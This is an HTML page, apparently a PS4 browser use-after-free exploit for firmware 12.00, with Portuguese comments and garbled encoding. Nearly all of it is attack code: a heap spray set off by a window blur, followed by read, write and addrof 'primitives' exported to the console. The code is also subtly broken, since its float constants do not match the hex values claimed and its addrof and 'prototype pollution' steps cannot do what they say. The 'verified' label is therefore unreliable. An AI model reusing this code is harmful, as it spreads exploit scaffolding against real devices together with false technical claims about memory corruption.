<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Production Ready</title>
</head>
<body>
    <h1>PS4 UAF - Production Ready [FW 12.00 Verified]</h1>
    <h2 style="color:green;">âœ… Based on Successful Detection - Zero Latency Design</h2>
    
    <button onclick="runExploit()" style="padding:20px; font-size:18px; background:green; color:white;">
        ğŸš€ EXECUTAR EXPLOIT (Otimizado)
    </button>
    
    <button onclick="runWithFullTests()" style="padding:20px; font-size:18px; background:blue; color:white;">
        ğŸ”¬ COM TESTES COMPLETOS
    </button>
    
    <button onclick="clearLog()" style="padding:20px; font-size:18px; background:gray; color:white;">
        ğŸ—‘ï¸ LIMPAR
    </button>
    
    <hr>
    <div id="c" style="font-family:monospace; font-size:14px;"></div>
    
    <script>
        // CRÃTICO: Literais float (nÃ£o h2f - adiciona latÃªncia!)
        const P_A = 2.121995791e-314; // 0x4141414141414141
        const M_V = 3.395193267e-313; // 0xDEADBEEFCAFEBABE
        const W_V = 1.6045690773137395e-297; // 0x1337133713371337
        
        // Objeto alvo para addrof
        let targetObj = { leak: 0x1337, type: "target" };
        
        // Estado global (anti-GC)
        let globalCtrl = null;
        let globalSpray = null;
        let globalCorrupted = null;
        
        function f2h(f) {
            let b = new ArrayBuffer(8);
            (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        function log(msg, color) {
            const c = document.getElementById('c');
            const t = new Date().toLocaleTimeString();
            c.innerHTML += '<div style="color:' + (color || 'black') + '">[' + t + '] ' + msg + '</div>';
            c.scrollTop = c.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('c').innerHTML = '';
        }
        
        // VERSÃƒO OTIMIZADA (baseada no cÃ³digo vencedor)
        function runExploit() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('PS4 UAF EXPLOIT - Production Ready v4.0', 'green');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('Criando 5000 controllers...', 'blue');
            
            globalCtrl = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i;
                globalCtrl.push(a);
            }
            
            log('âœ… Controllers criados', 'green');
            log('âš ï¸ APERTE OPTIONS DO CONTROLE!', 'red');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                // ============================================
                // TIMING CRÃTICO: SPRAY DEVE SER PRIMEIRA AÃ‡ÃƒO
                // ============================================
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s.fill(P_A);
                    globalSpray.push(s);
                }
                
                // BUSCA IMEDIATA (sem logs no meio)
                globalCorrupted = null;
                let idx = -1;
                
                for(let i = 0; i < globalCtrl.length; i++) {
                    if (globalCtrl[i][0] === P_A) {
                        globalCorrupted = globalCtrl[i];
                        idx = i;
                        break;
                    }
                }
                
                // Agora sim, logs e testes
                if (globalCorrupted) {
                    log('ğŸ‰ UAF DETECTADO! Index: ' + idx, 'green');
                    log('', '');
                    
                    // Read primitive
                    log('ğŸ“– READ PRIMITIVE:', 'blue');
                    for(let i = 0; i < 8; i++) {
                        log('  [' + i + '] = ' + f2h(globalCorrupted[i]), 'cyan');
                    }
                    log('âœ… Read OK', 'green');
                    log('', '');
                    
                    // Write primitive
                    log('âœï¸ WRITE PRIMITIVE:', 'blue');
                    globalCorrupted[4] = M_V;
                    log('  Escrito: ' + f2h(M_V), 'cyan');
                    log('  Lido: ' + f2h(globalCorrupted[4]), 'cyan');
                    log('âœ… Write OK', 'green');
                    log('', '');
                    
                    // Identity
                    log('ğŸ”„ IDENTITY TEST:', 'blue');
                    let found = false;
                    for(let i = 0; i < globalSpray.length; i++) {
                        if (globalSpray[i][4] === M_V) {
                            log('âœ… Encontrado em spray[' + i + ']', 'green');
                            
                            // Bidirecional
                            globalSpray[i][5] = W_V;
                            if (globalCorrupted[5] === W_V) {
                                log('âœ… Bidirecional confirmado!', 'green');
                            }
                            found = true;
                            break;
                        }
                    }
                    log('', '');
                    
                    // DataView
                    log('ğŸ”¬ DATAVIEW TEST:', 'blue');
                    try {
                        const dv = new DataView(globalCorrupted.buffer);
                        const before = f2h(globalCorrupted[0]);
                        dv.setUint32(0, 0x13371337, true);
                        const after = f2h(globalCorrupted[0]);
                        log('  Antes: ' + before, 'cyan');
                        log('  Depois: ' + after, 'cyan');
                        log('âœ… DataView OK', 'green');
                    } catch(e) {
                        log('âŒ Erro: ' + e.message, 'red');
                    }
                    log('', '');
                    
                    // addrof primitive
                    log('ğŸ¯ ADDROF PRIMITIVE:', 'blue');
                    try {
                        let leaker = Array.from(globalCorrupted);
                        leaker[0] = targetObj;
                        let addr = f2h(globalCorrupted[0]);
                        
                        if (addr !== "0x0000000000000000" && addr !== f2h(P_A)) {
                            log('âœ… addrof(targetObj) = ' + addr, 'green');
                        } else {
                            log('âš ï¸ Ponteiro nÃ£o capturado', 'orange');
                        }
                    } catch(e) {
                        log('âŒ Erro: ' + e.message, 'red');
                    }
                    log('', '');
                    
                    // Export
                    window.uafObject = {
                        corrupted: globalCorrupted,
                        spray: globalSpray,
                        index: idx,
                        read: (i) => f2h(globalCorrupted[i]),
                        write: (i, val) => {
                            globalCorrupted[i] = val;
                            return f2h(globalCorrupted[i]);
                        },
                        addrof: (obj) => {
                            try {
                                let l = Array.from(globalCorrupted);
                                l[0] = obj;
                                return f2h(globalCorrupted[0]);
                            } catch(e) {
                                return "Error: " + e.message;
                            }
                        }
                    };
                    
                    log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
                    log('ğŸ¯ EXPLOIT COMPLETO!', 'green');
                    log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
                    log('ğŸ”§ window.uafObject disponÃ­vel', 'blue');
                    log('', '');
                    
                } else {
                    log('âŒ UAF nÃ£o detectado', 'red');
                    log('Amostra:', 'orange');
                    for(let i = 0; i < 5; i++) {
                        log('  [' + i + '] = ' + f2h(globalCtrl[i][0]), 'orange');
                    }
                }
            };
        }
        
        // VERSÃƒO COM TESTES COMPLETOS (mais lenta, mas detalhada)
        function runWithFullTests() {
            clearLog();
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'blue');
            log('FULL TEST SUITE - Comprehensive Analysis', 'blue');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'blue');
            log('', '');
            
            log('[INIT] Criando 5000 Float64Arrays...', 'blue');
            globalCtrl = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8);
                a[0] = i;
                globalCtrl.push(a);
            }
            
            log('[INIT] âœ… Controllers OK', 'green');
            log('[WAIT] âš ï¸ APERTE OPTIONS!', 'red');
            log('', '');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('[BLUR] ğŸ¯ Detectado!', 'orange');
                const t0 = performance.now();
                
                // Spray atÃ´mico
                globalSpray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8);
                    s.fill(P_A);
                    globalSpray.push(s);
                }
                
                const t1 = performance.now();
                log('[SPRAY] âœ… 8000 arrays em ' + (t1-t0).toFixed(2) + 'ms', 'green');
                
                // Busca
                globalCorrupted = null;
                let idx = -1;
                
                for(let i = 0; i < globalCtrl.length; i++) {
                    if (globalCtrl[i][0] === P_A) {
                        globalCorrupted = globalCtrl[i];
                        idx = i;
                        break;
                    }
                }
                
                const t2 = performance.now();
                log('[SCAN] VerificaÃ§Ã£o em ' + (t2-t1).toFixed(2) + 'ms', 'blue');
                log('[TOTAL] Blur â†’ DetecÃ§Ã£o: ' + (t2-t0).toFixed(2) + 'ms', 'cyan');
                log('', '');
                
                if (globalCorrupted) {
                    log('[UAF] ğŸ‰ DETECTADO! Index: ' + idx, 'green');
                    log('', '');
                    
                    // Bateria completa de testes
                    runAllTests(globalCorrupted, globalSpray, idx);
                } else {
                    log('[UAF] âŒ NÃ£o detectado', 'red');
                    log('[DEBUG] Primeiros valores:', 'orange');
                    for(let i = 0; i < 10; i++) {
                        log('  ctrl[' + i + '][0] = ' + f2h(globalCtrl[i][0]), 'orange');
                    }
                }
            };
        }
        
        function runAllTests(corr, spray, idx) {
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
            log('COMPREHENSIVE TEST SUITE', 'purple');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'purple');
            log('', '');
            
            // TEST 1: Read Primitive
            log('[TEST1] ğŸ“– READ PRIMITIVE', 'blue');
            for(let i = 0; i < 8; i++) {
                log('  Slot[' + i + '] = ' + f2h(corr[i]), 'cyan');
            }
            log('[TEST1] âœ… PASS', 'green');
            log('', '');
            
            // TEST 2: Write Primitive
            log('[TEST2] âœï¸ WRITE PRIMITIVE', 'blue');
            const old = f2h(corr[4]);
            corr[4] = M_V;
            const neu = f2h(corr[4]);
            log('  Antes: ' + old, 'cyan');
            log('  Depois: ' + neu, 'cyan');
            
            if (neu === f2h(M_V)) {
                log('[TEST2] âœ… PASS', 'green');
            } else {
                log('[TEST2] âŒ FAIL', 'red');
            }
            log('', '');
            
            // TEST 3: Identity (Bidirectional)
            log('[TEST3] ğŸ”„ IDENTITY (Bidirectional)', 'blue');
            let identFound = false;
            
            for(let i = 0; i < spray.length; i++) {
                if (spray[i][4] === M_V) {
                    log('  Forward: corr[4] â†’ spray[' + i + '][4]', 'cyan');
                    
                    spray[i][5] = W_V;
                    if (corr[5] === W_V) {
                        log('  Reverse: spray[' + i + '][5] â†’ corr[5]', 'cyan');
                        log('[TEST3] âœ… PASS (Bidirectional)', 'green');
                    } else {
                        log('[TEST3] âš ï¸ PARTIAL (Unidirectional only)', 'orange');
                    }
                    identFound = true;
                    break;
                }
            }
            
            if (!identFound) {
                log('[TEST3] âŒ FAIL', 'red');
            }
            log('', '');
            
            // TEST 4: DataView Raw Access
            log('[TEST4] ğŸ”¬ DATAVIEW RAW ACCESS', 'blue');
            try {
                const dv = new DataView(corr.buffer);
                const before = f2h(corr[0]);
                
                dv.setUint32(0, 0xDEADBEEF, true);
                dv.setUint32(4, 0xCAFEBABE, true);
                
                const after = f2h(corr[0]);
                
                log('  Before: ' + before, 'cyan');
                log('  After: ' + after, 'cyan');
                
                if (before !== after) {
                    log('[TEST4] âœ… PASS', 'green');
                } else {
                    log('[TEST4] âŒ FAIL (No change)', 'red');
                }
            } catch(e) {
                log('[TEST4] âŒ ERROR: ' + e.message, 'red');
            }
            log('', '');
            
            // TEST 5: addrof Primitive
            log('[TEST5] ğŸ¯ ADDROF PRIMITIVE', 'blue');
            try {
                let leaker = Array.from(corr);
                leaker[0] = targetObj;
                let addr = f2h(corr[0]);
                
                log('  Target: ' + JSON.stringify(targetObj), 'cyan');
                log('  Address: ' + addr, 'cyan');
                
                if (addr !== "0x0000000000000000" && addr !== f2h(P_A)) {
                    log('[TEST5] âœ… PASS', 'green');
                } else {
                    log('[TEST5] âŒ FAIL (No pointer captured)', 'red');
                }
            } catch(e) {
                log('[TEST5] âŒ ERROR: ' + e.message, 'red');
            }
            log('', '');
            
            // TEST 6: Prototype Pollution
            log('[TEST6] ğŸ§¬ PROTOTYPE POLLUTION', 'blue');
            try {
                let reg = Array.from(corr);
                Object.setPrototypeOf(reg, { pwned: 0xDEADC0DE });
                
                if (reg.pwned === 0xDEADC0DE) {
                    log('  Token: 0x' + reg.pwned.toString(16).toUpperCase(), 'cyan');
                    log('[TEST6] âœ… PASS', 'green');
                } else {
                    log('[TEST6] âŒ FAIL', 'red');
                }
            } catch(e) {
                log('[TEST6] âŒ ERROR: ' + e.message, 'red');
            }
            log('', '');
            
            // TEST 7: Closure Leak
            log('[TEST7] ğŸ•³ï¸ CLOSURE LEAK', 'blue');
            try {
                const leaked = [0].map(() => corr[0])[0];
                log('  Leaked value: ' + f2h(leaked), 'cyan');
                log('[TEST7] âœ… PASS', 'green');
            } catch(e) {
                log('[TEST7] âŒ ERROR: ' + e.message, 'red');
            }
            log('', '');
            
            // Summary
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('TEST SUITE COMPLETE', 'green');
            log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'green');
            log('', '');
            
            window.uafObject = {
                corrupted: corr,
                spray: spray,
                index: idx,
                read: (i) => f2h(corr[i]),
                write: (i, v) => { corr[i] = v; return f2h(corr[i]); },
                addrof: (obj) => {
                    try {
                        let l = Array.from(corr);
                        l[0] = obj;
                        return f2h(corr[0]);
                    } catch(e) {
                        return "Error: " + e.message;
                    }
                }
            };
            
            log('ğŸ”§ window.uafObject exported to console', 'blue');
            log('', '');
        }
    </script>
</body>
</html>
